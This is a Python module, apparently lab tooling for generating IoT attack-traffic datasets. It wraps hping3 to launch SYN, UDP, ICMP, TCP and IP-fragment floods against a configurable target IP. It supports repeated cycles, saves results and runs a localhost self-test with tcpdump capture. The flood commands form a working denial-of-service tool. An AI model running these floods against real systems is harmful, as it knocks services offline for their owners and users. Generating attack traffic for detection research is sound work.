"""
Attack Engine V2 - Enhanced Attack Engine with Cyclic Attack Support

This module provides functionality for:
- SYN flood attacks
- UDP flood attacks  
- ICMP flood attacks
- Cyclic attack execution with duration and settle time
- Attack monitoring and statistics
"""

import asyncio
import logging
import subprocess
import sys
import time
from typing import Optional, Dict, Any, List
from dataclasses import dataclass
from enum import Enum
import json
import os
from datetime import datetime

# Configure logger
logger = logging.getLogger(__name__)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    filename='logs/app.log',
    filemode='a'
)
console = logging.StreamHandler(sys.stdout)
console.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(name)s: %(message)s')
console.setFormatter(formatter)
logging.getLogger('').addHandler(console)

class AttackType(Enum):
    """Attack type enumeration"""
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    ICMP_FLOOD = "icmp_flood"
    TCP_FLOOD = "tcp_flood"
    IP_FRAG_FLOOD = "ip_frag_flood"

class AttackMode(Enum):
    """Attack mode enumeration"""
    SINGLE = "single"          # Single attack
    CYCLIC = "cyclic"          # Cyclic attack

@dataclass
class AttackConfig:
    """Attack configuration data class"""
    attack_type: AttackType
    target_ip: str
    interface: str = "wlan0"  # Default to wlan0, prefer IoT network interface
    port: int = 55443
    duration_sec: int = 60
    settle_time_sec: int = 30
    cycles: int = 1
    mode: AttackMode = AttackMode.SINGLE

@dataclass
class AttackResult:
    """Attack result data class"""
    cycle: int
    start_time: datetime
    end_time: datetime
    duration_sec: float
    success: bool
    return_code: int
    stdout: str
    stderr: str
    error: Optional[str] = None

class CyclicAttackEngine:
    """Enhanced attack engine with cyclic attack support"""
    
    def __init__(self, results_dir: str = "../data/attack_results"):
        self.attack_process: Optional[asyncio.subprocess.Process] = None
        self.current_attack: Optional[AttackConfig] = None
        self.attack_results: List[AttackResult] = []
        self.is_running: bool = False
        self.current_cycle: int = 0
        self.total_cycles: int = 0
        self.results_dir = results_dir
        
        # Ensure results directory exists
        os.makedirs(self.results_dir, exist_ok=True)
    
    async def start_cyclic_attack(self, config: AttackConfig) -> bool:
        """
        Start cyclic attack
        
        Args:
            config: Attack configuration
            
        Returns:
            bool: Whether the attack started successfully
        """
        logger.info(f"Starting cyclic attack: {config.attack_type.value} -> {config.target_ip}")
        logger.info(f"Config: mode={config.mode.value}, cycles={config.cycles}, "
                   f"duration={config.duration_sec}s, settle_time={config.settle_time_sec}s")
        
        self.current_attack = config
        self.attack_results = []
        self.is_running = True
        self.current_cycle = 0
        self.total_cycles = config.cycles
        
        try:
            if config.mode == AttackMode.SINGLE:
                # Single attack mode
                result = await self._execute_single_attack(config)
                self.attack_results.append(result)
                return result.success
            elif config.mode == AttackMode.CYCLIC:
                # Cyclic attack mode
                return await self._execute_cyclic_attack(config)
            else:
                logger.error(f"Unsupported attack mode: {config.mode}")
                return False
                
        except Exception as e:
            logger.error(f"Failed to start cyclic attack: {e}")
            self.is_running = False
            return False
    
    async def _execute_cyclic_attack(self, config: AttackConfig) -> bool:
        """Execute cyclic attack"""
        logger.info(f"Starting {config.cycles} cycles of attack")
        
        for cycle in range(1, config.cycles + 1):
            self.current_cycle = cycle
            logger.info(f"Starting cycle {cycle}/{config.cycles} attack")
            
            # Execute single attack
            result = await self._execute_single_attack(config, cycle)
            self.attack_results.append(result)
            
            if not result.success:
                logger.error(f"Cycle {cycle} attack failed: {result.error}")
                if cycle < config.cycles:
                    logger.info(f"Continuing to next cycle...")
            
            # If not the last cycle, wait for settle time
            if cycle < config.cycles:
                logger.info(f"Waiting {config.settle_time_sec} seconds before next cycle...")
                # Add extra cleanup time to ensure network buffers are cleared
                await asyncio.sleep(config.settle_time_sec + 1)
        
        self.is_running = False
        logger.info("Cyclic attack completed")
        
        # Save attack results
        await self._save_attack_results(config)
        
        return True
    
    async def _execute_single_attack(self, config: AttackConfig, cycle: int = 1) -> AttackResult:
        """Execute a single attack"""
        start_time = datetime.now()
        logger.info(f"Executing cycle {cycle} attack: {config.attack_type.value} -> {config.target_ip}")
        
        try:
            # Build attack command
            command = self._build_attack_command(config)
            if not command:
                return AttackResult(
                    cycle=cycle,
                    start_time=start_time,
                    end_time=datetime.now(),
                    duration_sec=0,
                    success=False,
                    return_code=-1,
                    stdout="",
                    stderr="",
                    error=f"Unknown attack type: {config.attack_type.value}"
                )
            
            # Add timeout control
            command = ['timeout', str(config.duration_sec)] + command
            logger.info(f"Executing command: {' '.join(command)}")
            
            # Create subprocess to execute attack
            self.attack_process = await asyncio.create_subprocess_exec(
                *command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            if not self.attack_process or not self.attack_process.pid:
                return AttackResult(
                    cycle=cycle,
                    start_time=start_time,
                    end_time=datetime.now(),
                    duration_sec=0,
                    success=False,
                    return_code=-1,
                    stdout="",
                    stderr="",
                    error="Failed to create attack process"
                )
            
            # Wait for process to complete and capture output
            stdout, stderr = await self.attack_process.communicate()
            end_time = datetime.now()
            
            # Ensure process is fully terminated
            if self.attack_process and self.attack_process.returncode is None:
                try:
                    self.attack_process.terminate()
                    await asyncio.wait_for(self.attack_process.wait(), timeout=2.0)
                except asyncio.TimeoutError:
                    self.attack_process.kill()
                    await self.attack_process.wait()
            
            # Analyze result
            return_code = self.attack_process.returncode
            duration_sec = (end_time - start_time).total_seconds()
            
            # Consider 0 or 124 as success
            success = return_code in [0, 124]
            
            stdout_text = stdout.decode('utf-8', errors='ignore') if stdout else ""
            stderr_text = stderr.decode('utf-8', errors='ignore') if stderr else ""
            
            logger.info(f"Cycle {cycle} attack completed: {'Success' if success else 'Failure'} "
                       f"(Return code: {return_code}, Duration: {duration_sec:.1f}s)")
            
            return AttackResult(
                cycle=cycle,
                start_time=start_time,
                end_time=end_time,
                duration_sec=duration_sec,
                success=success,
                return_code=return_code,
                stdout=stdout_text,
                stderr=stderr_text
            )
            
        except Exception as e:
            end_time = datetime.now()
            duration_sec = (end_time - start_time).total_seconds()
            logger.error(f"Exception during cycle {cycle} attack: {e}")
            
            return AttackResult(
                cycle=cycle,
                start_time=start_time,
                end_time=end_time,
                duration_sec=duration_sec,
                success=False,
                return_code=-1,
                stdout="",
                stderr="",
                error=str(e)
            )
    
    def _build_attack_command(self, config: AttackConfig) -> Optional[List[str]]:
        """Build the attack command"""
        # Get interface IP address
        source_ip = self._get_interface_ip(config.interface)
        if not source_ip:
            logger.warning(f"Failed to get IP address for interface {config.interface}, using default source address")
            source_ip = "0.0.0.0"
        
        attack_commands = {
            AttackType.SYN_FLOOD: [
                'hping3', '-S', '-I', config.interface,
                '-a', source_ip, '-p', str(config.port),
                '-i', 'u1000', '--flood', config.target_ip
            ],
            AttackType.UDP_FLOOD: [
                'hping3', '--udp', '-I', config.interface,
                '-a', source_ip, '-p', str(config.port),
                '-i', 'u1000', '--flood', config.target_ip
            ],
            AttackType.ICMP_FLOOD: [
                'hping3', '--icmp', '-a', source_ip,
                '--flood', config.target_ip
            ],
            AttackType.TCP_FLOOD: [
                'hping3', '-A', '-I', config.interface,
                '-a', source_ip, '-p', str(config.port),
                '-i', 'u1000', '--flood', config.target_ip
            ],
            AttackType.IP_FRAG_FLOOD: [
                'hping3', '-f', '-I', config.interface,
                '-a', source_ip, '-p', str(config.port),
                '--flood', config.target_ip
            ]
        }
        
        return attack_commands.get(config.attack_type)
    
    def _get_interface_ip(self, interface: str) -> Optional[str]:
        """Get the IP address of the specified network interface"""
        try:
            if interface == 'any':
                # Get source IP of default route
                result = subprocess.run(['ip', 'route', 'get', '8.8.8.8'], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'src' in line:
                            parts = line.split()
                            src_index = parts.index('src') + 1
                            if src_index < len(parts):
                                return parts[src_index]
            else:
                # Get IP address of the specified interface
                result = subprocess.run(['ip', 'addr', 'show', interface], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'inet ' in line and 'scope global' in line:
                            parts = line.strip().split()
                            if len(parts) >= 2:
                                ip_with_mask = parts[1]
                                ip = ip_with_mask.split('/')[0]
                                logger.info(f"IP address of interface {interface}: {ip}")
                                return ip
        except Exception as e:
            logger.error(f"Failed to get IP address for interface {interface}: {e}")
        
        return None
    
    async def stop_attack(self) -> bool:
        """Stop the current attack"""
        if not self.attack_process:
            logger.warning("No attack process is currently running")
            return False
        
        try:
            logger.info("Stopping attack...")
            self.attack_process.terminate()
            
            try:
                await asyncio.wait_for(self.attack_process.wait(), timeout=5.0)
            except asyncio.TimeoutError:
                logger.warning("Process did not exit gracefully, killing it")
                self.attack_process.kill()
                await self.attack_process.wait()
            
            logger.info("Attack stopped")
            self.attack_process = None
            self.is_running = False
            return True
            
        except Exception as e:
            logger.error(f"Failed to stop attack: {e}")
            if self.attack_process:
                try:
                    self.attack_process.kill()
                except:
                    pass
                self.attack_process = None
            self.is_running = False
            return False
    
    def get_attack_status(self) -> Dict[str, Any]:
        """Get attack status"""
        status = {
            'is_running': self.is_running,
            'current_cycle': self.current_cycle,
            'total_cycles': self.total_cycles,
            'progress': f"{self.current_cycle}/{self.total_cycles}" if self.total_cycles > 0 else "0/0",
            'attack_config': self.current_attack.to_dict() if self.current_attack else None,
            'results_count': len(self.attack_results),
            'successful_cycles': len([r for r in self.attack_results if r.success]),
            'failed_cycles': len([r for r in self.attack_results if not r.success])
        }
        
        if self.attack_process:
            try:
                status['process_pid'] = self.attack_process.pid
                status['process_returncode'] = self.attack_process.returncode
            except Exception as e:
                logger.warning(f"Failed to get process status: {e}")
        
        return status
    
    async def _save_attack_results(self, config: AttackConfig):
        """Save attack results"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"attack_results_{config.attack_type.value}_{config.target_ip.replace('.', '_')}_{timestamp}.json"
        filepath = os.path.join(self.results_dir, filename)
        
        # Prepare data to save
        save_data = {
            'attack_config': {
                'attack_type': config.attack_type.value,
                'target_ip': config.target_ip,
                'interface': config.interface,
                'port': config.port,
                'duration_sec': config.duration_sec,
                'settle_time_sec': config.settle_time_sec,
                'cycles': config.cycles,
                'mode': config.mode.value
            },
            'summary': {
                'total_cycles': len(self.attack_results),
                'successful_cycles': len([r for r in self.attack_results if r.success]),
                'failed_cycles': len([r for r in self.attack_results if not r.success]),
                'total_duration': sum(r.duration_sec for r in self.attack_results),
                'average_duration': sum(r.duration_sec for r in self.attack_results) / len(self.attack_results) if self.attack_results else 0
            },
            'results': [
                {
                    'cycle': r.cycle,
                    'start_time': r.start_time.isoformat(),
                    'end_time': r.end_time.isoformat(),
                    'duration_sec': r.duration_sec,
                    'success': r.success,
                    'return_code': r.return_code,
                    'error': r.error
                }
                for r in self.attack_results
            ]
        }
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(save_data, f, indent=2, ensure_ascii=False)
            logger.info(f"Attack results saved to: {filepath}")
        except Exception as e:
            logger.error(f"Failed to save attack results: {e}")
    
    def get_attack_results(self) -> List[AttackResult]:
        """Get list of attack results"""
        return self.attack_results.copy()
    
    def is_attack_running(self) -> bool:
        """Check if an attack is currently running"""
        return self.is_running


# Extend AttackConfig to support to_dict method
def to_dict(self) -> Dict[str, Any]:
    """Convert to dict format"""
    return {
        'attack_type': self.attack_type.value,
        'target_ip': self.target_ip,
        'interface': self.interface,
        'port': self.port,
        'duration_sec': self.duration_sec,
        'settle_time_sec': self.settle_time_sec,
        'cycles': self.cycles,
        'mode': self.mode.value
    }

# Dynamically add to_dict method to AttackConfig class
AttackConfig.to_dict = to_dict


if __name__ == '__main__':
    # Test cyclic attack engine
    async def test_cyclic_attack():
        from traffic_capture import TcpdumpUtil
        
        engine = CyclicAttackEngine()
        
        # Create cyclic attack config
        config = AttackConfig(
            attack_type=AttackType.SYN_FLOOD,
            target_ip='127.0.0.1',
            interface='any',
            port=80,
            duration_sec=10,      # 10 seconds per cycle
            settle_time_sec=5,    # 5 seconds between cycles
            cycles=3,             # 3 cycles
            mode=AttackMode.CYCLIC
        )
        
        # Create traffic capture
        tcpdump = TcpdumpUtil(
            output_file='../data/cyclic_attack_capture.pcap',
            interface='any',  # Use same interface as attack
            extra_args=['-s', '0']
        )
        
        try:
            print("Starting cyclic attack test...")
            print(f"Config: {config}")
            
            # Start traffic capture
            tcpdump.start()
            await asyncio.sleep(1)
            
            # Start cyclic attack
            success = await engine.start_cyclic_attack(config)
            
            if success:
                print("Cyclic attack completed!")
                
                # Show results
                results = engine.get_attack_results()
                print(f"\nAttack Results:")
                for result in results:
                    status = "Success" if result.success else "Failure"
                    print(f"  Cycle {result.cycle}: {status} (Duration: {result.duration_sec:.1f}s)")
                
                # Show statistics
                status = engine.get_attack_status()
                print(f"\nStatistics:")
                print(f"  Total cycles: {status['total_cycles']}")
                print(f"  Successful cycles: {status['successful_cycles']}")
                print(f"  Failed cycles: {status['failed_cycles']}")
            else:
                print("Cyclic attack failed!")
            
            # Stop traffic capture
            tcpdump.stop()
            print("Test completed! Check ../data/cyclic_attack_capture.pcap")
            
        except Exception as e:
            print(f"Test failed: {e}")
            if engine.is_attack_running():
                await engine.stop_attack()
            try:
                tcpdump.stop()
            except:
                pass
    
    # Run test
    try:
        asyncio.run(test_cyclic_attack())
    except KeyboardInterrupt:
        print("\nTest interrupted by user")
    except Exception as e:
        print(f"\nError occurred during test: {e}") 